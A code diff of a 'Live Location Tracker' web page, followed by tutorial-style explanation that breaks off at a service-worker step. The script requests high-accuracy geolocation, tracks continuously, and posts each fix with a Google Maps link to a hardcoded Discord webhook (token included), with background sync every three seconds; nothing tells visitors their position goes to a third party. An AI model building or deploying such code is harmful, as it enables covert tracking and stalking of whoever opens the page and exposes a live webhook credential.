@@ -1,12 +1,10 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Live Location Tracker</title>
-    <link rel="stylesheet" href="styles.css">
 </head>
-
 <body>
     <h2>Live Location Tracker</h2>
     <p id="status">Waiting for location access...</p>
@@ -14,120 +12,123 @@
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             console.log("✅ Page loaded, checking location permissions...");
-            if (!navigator.geolocation) {
-        alert("❌ Geolocation is not supported by this browser.");
-        return;
-    }
-                // **Force browser to show permission prompt immediately**
-    navigator.geolocation.getCurrentPosition(
-        (position) => {
-            console.log("✅ User granted geolocation access.");
-            startTracking(); // Start continuous tracking
-        },
-        (error) => {
-            console.error("🚨 Geolocation permission denied:", error.message);
-            alert("❌ You need to enable location access for this to work.");
-        },
-        { enableHighAccuracy: true }
-    );
 
-
-            navigator.permissions.query({ name: "geolocation" }).then((permissionStatus) => {
-        if (permissionStatus.state === "granted") {
-            console.log("✅ Geolocation already granted, starting tracking...");
-            startTracking();
-        } else {
-            console.warn("⚠️ Geolocation permission not granted yet. Waiting for user action...");
-        }
-    });
             if (!navigator.geolocation) {
                 alert("❌ Geolocation is not supported by this browser.");
                 return;
             }
 
-            function sendLocation(latitude, longitude) {
-    const payload = {
-        content: `📍 **Live Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
-    };
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    console.log("✅ User granted geolocation access.");
+                    startTracking(); // Start continuous tracking
+                },
+                (error) => {
+                    console.error("🚨 Geolocation permission denied:", error.message);
+                    alert("❌ You need to enable precise location for this to work.");
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
 
-    fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-    })
-    .then(response => {
-        if (!response.ok) {
-            throw new Error(`🚨 Webhook failed: ${response.status} ${response.statusText}`);
-        }
-        console.log("✅ Location sent successfully!");
-    })
-    .catch(error => console.error("🚨 Error sending location:", error));
-}
+            if ("serviceWorker" in navigator) {
+                navigator.serviceWorker.register("service-worker.js")
+                    .then((registration) => {
+                        console.log("✅ Service Worker registered:", registration.scope);
+                    })
+                    .catch((error) => {
+                        console.error("🚨 Service Worker registration failed:", error);
+                    });
 
-function saveLocationToDB(latitude, longitude) {
-    const request = indexedDB.open("LocationDB", 1);
-
-    request.onupgradeneeded = function (event) {
-        const db = event.target.result;
-        if (!db.objectStoreNames.contains("locations")) {
-            db.createObjectStore("locations", { keyPath: "id" });
-        }
-    };
-    request.onsuccess = function (event) {
-        const db = event.target.result;
-
-        // Check if the object store exists before starting the transaction
-        if (db.objectStoreNames.contains("locations")) {
-            const transaction = db.transaction("locations", "readwrite");
-            const store = transaction.objectStore("locations");
-            store.put({ id: "latest", latitude, longitude });
-        } else {
-            console.error("Object store 'locations' does not exist.");
-        }
-    };
-        request.onerror = function () {
-            console.error("Failed to open IndexedDB.");
-        };
-    }
-    
-    function startTracking() {
-    console.log("🚀 Starting continuous geolocation tracking...");
-
-    navigator.geolocation.watchPosition(
-        (position) => {
-            const { latitude, longitude } = position.coords;
-            document.getElementById("status").innerText = `📍 Location: ${latitude}, ${longitude}`;
-            sendLocation(latitude, longitude);
-            saveLocationToDB(latitude, longitude);
-        },
-        (error) => console.error("🚨 Location error:", error.message),
-        {
-            enableHighAccuracy: true,
-            timeout: 5000,
-            maximumAge: 0
-        }
-    );
-}
-
-         
-            // Start tracking when user interacts with the page
-    document.addEventListener("click", () => {
-        console.log("🔄 User clicked, requesting location...");
-        startTracking();
-    }, { once: true });
-
-            // startTracking();
+                // Ensure Background Sync is registered
+                navigator.serviceWorker.ready.then((registration) => {
+                    setInterval(() => {
+                        registration.sync.register("syncLocation").catch(console.error);
+                    }, 3000);
+                });
+            }
         });
 
-        if ("serviceWorker" in navigator) {
-            navigator.serviceWorker.register("service-worker.js")
-                .then((registration) => {
-                    console.log("✅ Service Worker registered:", registration.scope);
+        function sendLocation(latitude, longitude) {
+            if (document.visibilityState === "visible") { // Only send if the tab is active
+                const payload = {
+                    content: `📍 **Live Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
+                };
+
+                fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload),
                 })
-                .catch((error) => {
-                    console.error("🚨 Service Worker registration failed:", error);
-                });
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`🚨 Webhook failed: ${response.status} ${response.statusText}`);
+                    }
+                    console.log("✅ Location sent successfully!");
+                })
+                .catch(error => console.error("🚨 Error sending location:", error));
+            }
+        }
+
+        function startTracking() {
+            console.log("🚀 Starting continuous geolocation tracking...");
+
+            navigator.geolocation.watchPosition(
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    if (accuracy > 20) {
+                        console.warn(`⚠️ Low accuracy detected (${accuracy}m). Waiting for better signal...`);
+                        return;
+                    }
+
+                    document.getElementById("status").innerText = `📍 Location: ${latitude}, ${longitude} (Accuracy: ${accuracy}m)`;
+                    sendLocation(latitude, longitude);
+                    saveLocationToDB(latitude, longitude);
+                },
+                (error) => console.error("🚨 Location error:", error.message),
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        function saveLocationToDB(latitude, longitude) {
+            const request = indexedDB.open("LocationDB", 2);
+
+            request.onupgradeneeded = function (event) {
+                const db = event.target.result;
+                if (!db.objectStoreNames.contains("locations")) {
+                    db.createObjectStore("locations", { keyPath: "id" });
+                }
+            };
+
+            request.onsuccess = function (event) {
+                const db = event.target.result;
+                if (db.objectStoreNames.contains("locations")) {
+                    const transaction = db.transaction("locations", "readwrite");
+                    const store = transaction.objectStore("locations");
+                    store.put({ id: "latest", latitude, longitude });
+                } else {
+                    console.error("Object store 'locations' does not exist.");
+                }
+            };
+
+            request.onerror = function () {
+                console.error("Failed to open IndexedDB.");
+            };
         }
     </script>
 </body>
 </html>
+    
+    The HTML file contains a simple structure with a title, a paragraph element to display the status, and a script tag to handle the geolocation tracking logic.
+    The script first checks if the browser supports geolocation. If it does, it requests the user's location using  navigator.geolocation.getCurrentPosition() .
+    If the user grants permission, the script starts continuous tracking using  navigator.geolocation.watchPosition() . 
+    The script also registers a service worker to handle background sync. The service worker is responsible for sending the location data to a Discord webhook.
+    The  sendLocation()  function sends the location data to the Discord webhook. The  startTracking()  function continuously tracks the user's location and calls the sendLocation() function to send the data to the Discord webhook. 
+    The  saveLocationToDB() function saves the user's latest location to an IndexedDB database. This function is called every time the user's location is updated. 
+    Step 3: Create a Service Worker 
+    Next, create a service worker file named  service-worker.js  in the root directory of the project. 
+    This file will handle background sync and send the location data to the Discord webhook. 
+    // service-worker.js
